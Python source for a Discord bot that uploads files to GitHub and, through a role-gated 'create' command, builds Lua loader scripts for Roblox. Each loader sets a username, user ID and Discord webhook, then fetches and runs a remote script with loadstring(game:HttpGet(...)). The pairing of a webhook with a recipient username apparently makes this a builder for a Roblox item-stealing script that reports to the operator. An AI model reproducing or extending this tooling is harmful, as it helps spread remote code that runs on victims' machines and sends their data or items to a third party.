import os
import discord
from discord.ext import commands
from discord import app_commands
import aiohttp
import base64

# Load environment variables
TOKEN = os.getenv("DISCORD_TOKEN")
GITHUB_TOKEN = os.getenv("G_GITHUB_TOKEN")  # GitHub token
GITHUB_REPO = os.getenv("G_GITHUB_REPO")    # Repository name
GUILD_ID = int(os.getenv("GUILD_ID"))  # Discord server ID
REQUIRED_ROLE_ID = int(os.getenv("REQUIRED_ROLE_ID"))  # Role ID required to use commands

# Initialize bot
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

async def check_permissions(interaction: discord.Interaction) -> bool:
    """Checks if the user has the required role and is in the correct server."""
    if interaction.guild_id != GUILD_ID:
        await interaction.response.send_message("❌ This command can only be used in the designated server.", ephemeral=True)
        return False

    user = interaction.user
    if not any(role.id == REQUIRED_ROLE_ID for role in user.roles):
        await interaction.response.send_message("❌ You do not have permission to use this command.", ephemeral=True)
        return False

    return True

# Upload Command
@bot.tree.command(name="upload", description="Upload a file to GitHub")
async def upload(interaction: discord.Interaction, file: discord.Attachment):
    if not await check_permissions(interaction):
        return

    await interaction.response.defer(ephemeral=True)

    try:
        file_bytes = await file.read()
        encoded_content = base64.b64encode(file_bytes).decode()

        github_url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{file.filename}"
        raw_url = f"https://raw.githubusercontent.com/{GITHUB_REPO}/main/{file.filename}"

        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        }

        data = {
            "message": f"Upload {file.filename}",
            "content": encoded_content
        }

        async with aiohttp.ClientSession() as session:
            async with session.put(github_url, headers=headers, json=data) as response:
                result = await response.json()
                if response.status in [200, 201]:
                    await interaction.followup.send(
                        f"✅ File uploaded successfully!\n"
                        f"```lua\nloadstring(game:HttpGet(\"{raw_url}\"))()\n```",
                        ephemeral=True
                    )
                else:
                    error_msg = result.get("message", "Unknown error")
                    await interaction.followup.send(f"❌ Upload failed: {error_msg}", ephemeral=True)

    except Exception as e:
        await interaction.followup.send(f"❌ An error occurred: {str(e)}", ephemeral=True)

# Create Command
@bot.tree.command(name="create", description="Create a formatted Lua script file")
async def create(
    interaction: discord.Interaction, 
    username: str, 
    webhook: str, 
    mobile: bool, 
    userid: discord.Member, 
    username2: str = None
):
    if not await check_permissions(interaction):
        return

    await interaction.response.defer(ephemeral=True)

    raw_url = "https://raw.githubusercontent.com/YuzhuScripts/Games/main/NewGenFisch.lua"

    script_content = f'Username = "{username}"\n'
    if username2:
        script_content += f'Username2 = "{username2}"\n'
    script_content += f'Webhook = "{webhook}"\n'
    script_content += f'Mobile = {str(mobile).lower()}\n'
    script_content += f'UserId = "{userid.id}"\n\n'
    script_content += f'loadstring(game:HttpGet("{raw_url}"))()'

    filename = f"{username}_script.lua"
    with open(filename, "w", encoding="utf-8") as file:
        file.write(script_content)

    await interaction.followup.send("✅ Here is your generated Lua script:", file=discord.File(filename), ephemeral=True)
    os.remove(filename)

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"Bot is ready and logged in as {bot.user}")

bot.run(TOKEN)
